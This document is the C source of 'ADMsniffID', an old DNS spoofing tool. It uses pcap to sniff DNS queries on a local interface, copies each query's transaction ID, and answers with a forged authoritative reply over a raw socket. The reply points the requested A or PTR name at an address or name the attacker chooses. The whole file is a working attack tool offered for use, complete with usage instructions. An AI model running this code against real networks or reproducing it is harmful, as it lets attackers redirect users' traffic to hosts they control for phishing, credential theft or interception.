
#include <pcap.h>

#include "ADM-spoof.c"
#include "dns.h"
#include "ADMDNS2.c"

#define  ERROR	    -1                
#define  DNSHDRSIZE 12    
#define  VERSION    "ver 0.4 pub" 

int ETHHDRSIZE;

void usage(){
 printf("usage : ADMsniffID <device> <IP> <name> <type of spoof[1,12]> \n");
 printf("ex: ADMsniffID eth0 \"127.0.0.1\" \"www.its.me.com\" \n");
 exit(ERROR);
}       
                     
void main(int argc, char **argv)
   {     
   struct pcap_pkthdr h;
   struct pcap *pcap_d;
	 struct   iphdr  *ip;
	 struct   udphdr *udp;
	 struct   dnshdr *dnsrecv,*dnssend;
	 char            *data;
	 char            *data2;
	 char            *buffer;
         char            SPOOFIP[255];
         char            bla[255];
         char            spoofname[255];
         char            tmp2[255];
         char            ebuf[255];
         char            buffer2[1024];    
         unsigned char   namez[255];                          
	 int sraw,on=1,tmp1,type;


if(argc <2)usage();
if(strstr(argv[1],"ppp0"))ETHHDRSIZE = 0;
  else ETHHDRSIZE = 14; 
	
strcpy(SPOOFIP,argv[2]);
strcpy(spoofname,argv[3]);
type = atoi(argv[4]);
  
/* Buffer 'n' tcp/ip stuff */
 
 dnssend = (struct dnshdr  *)buffer2;
 data2   = (char *)(buffer2+12);

 
 
 /* bzero(buffer,sizeof(buffer));          */
 bzero(bla,sizeof(bla));
 bzero(buffer2,sizeof(buffer2));
   
  
if( (sraw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR){
    perror("socket");
    exit(ERROR);
    }

if( (setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR){
  perror("setsockopt");
  exit(ERROR);
  }    
 
 /* open pcap descriptor */
 
 pcap_d = pcap_open_live(argv[1],sizeof(buffer),0,100,ebuf);
        
printf("ADMsniffID %s (c) ADMnHeike\n",VERSION);

while(1){    
 
 buffer =(u_char *)pcap_next(pcap_d,&h); /* catch the packet */
  
    
 ip      = (struct iphdr   *)(buffer+ETHHDRSIZE);
 udp     = (struct udphdr  *)(buffer+ETHHDRSIZE+IPHDRSIZE);
 dnsrecv = (struct dnshdr  *)(buffer+ETHHDRSIZE+IPHDRSIZE+UDPHDRSIZE);
 data    = (char *)(buffer+ETHHDRSIZE+IPHDRSIZE+UDPHDRSIZE+DNSHDRSIZE);

 if(ip->protocol == 17)
  if(udp->dest == htons(53) )    
    if(dnsrecv->qr == 0)
      {
     strcpy(namez,data); 
     nameformat(namez,bla);
     printf("hum we have a DNS question from %s diz guyz wanna %s!\n",inet_ntoa(ip->saddr),(char *)bla); 
             
     bzero(bla,sizeof(bla));
     printf("the question have the type %i and type of the query %i\n"
            ,ntohs(*((u_short *)(data+strlen(data)+1)))
            ,ntohs(*((u_short *)(data+strlen(data)+2+1))));
    
     /* well in diz version we only spoof  the type 'A'       */
     /* check out for a new version in ftp.janova.org/pub/ADM */
       
   
     printf("make the spoof packet...\n");
     printf("dns header\n");  

     /* here we gonna start to make the spoofed paket :)*/
       
       memcpy(dnssend,dnsrecv,DNSHDRSIZE+strlen(namez)+5);
       
       dnssend->id=dnsrecv->id;         /* haha the ID ;)     */   
       dnssend->aa=1;  		        /* i've the authority */ 
       dnssend->ra=1;                   /* i've the recusion  */
       dnssend->qr=1;                   /* its a awser        */
       dnssend->rep_num = htons(1);     /* i've one awnser    */

            
     printf("ID=%i\nnumba of question=%i\nnumba of awnser =%i\n"
            ,dnssend->id,ntohs(dnssend->que_num),ntohs(dnssend->rep_num));  
     printf("Question..\n");
     printf("domainename=%s\n",data2);
     printf("type of question=%i\n",ntohs(*((u_short *)(data2+strlen(namez)+1))));
     printf("type of query=%i\n",ntohs(*((u_short *)(data2+strlen(namez)+1+2))));
     
      if( type ==   TYPE_PTR){ 
        tmp1=strlen(namez)+5;
        strcpy(data2+tmp1,namez);
        tmp1=tmp1+strlen(namez)+1;                            
        
        bzero(tmp2,sizeof(tmp2));
        nameformat(spoofname,tmp2); 
        printf("tmp2 = %s\n",tmp2);
     
      
      printf(" mouhahahah \n");
      *((u_short  *)(data2+tmp1)) = htons(TYPE_PTR);   
      *((u_short  *)(data2+tmp1+2))       = htons(1);
      *((u_long *)(data2+tmp1+2+2))       = htonl(86400);
      *((u_short  *)(data2+tmp1+2+2+4))   = htons(strlen((tmp2)+1));
      printf("bhaa?.\n");
      strcpy((data2+tmp1+2+2+4+2),tmp2);
      printf(" ouf !! =) \n");
      tmp1 = tmp1 +strlen(tmp2)+ 1;
   
    }
      
      if( type  == TYPE_A){
      tmp1=strlen(namez)+5;
      strcpy(data2+tmp1,namez);
      tmp1=tmp1+strlen(namez)+1;
      *((u_short  *)(data2+tmp1))         = htons(TYPE_A);
      *((u_short  *)(data2+tmp1+2))       = htons(1);
      *((u_long *)(data2+tmp1+2+2))       = htonl(86400);      
      *((u_short  *)(data2+tmp1+2+2+4))   = htons(4);
      *((u_long *)(data2+tmp1+2+2+4+2)) = host2ip(SPOOFIP);
                  
      }
                        
    printf("Answer..\n");
    printf("domainname=%s\n",tmp2);
    printf("type=%i\n",ntohs(*((u_short  *)(data2+tmp1))));
    printf("classe=%i\n",ntohs(*((u_short  *)(data2+tmp1+2))));
    printf("time to live=%u\n",ntohl(*((u_long *)(data2+tmp1+2+2))));
    printf("resource data lenght=%i\n",ntohs(*((u_short  *)(data2+tmp1+2+2+4))));
    printf("IP=%s\n",inet_ntoa(*((u_long *)(data2+tmp1+2+2+4+2))));
    
    tmp1=tmp1+2+2+4+2+4; /* now tmp1 == the total length of packet dns */
    			 /* without the dnshdr                         */
          
      
      udp_send(sraw
              ,ip->daddr
              ,ip->saddr
              ,ntohs(udp->dest)
              ,ntohs(udp->source)
              ,buffer2
              ,DNSHDRSIZE+tmp1);
           } /* end of the spoof             */           
  } /* end of while(1)                     */
} /* The End !! ;)                        */



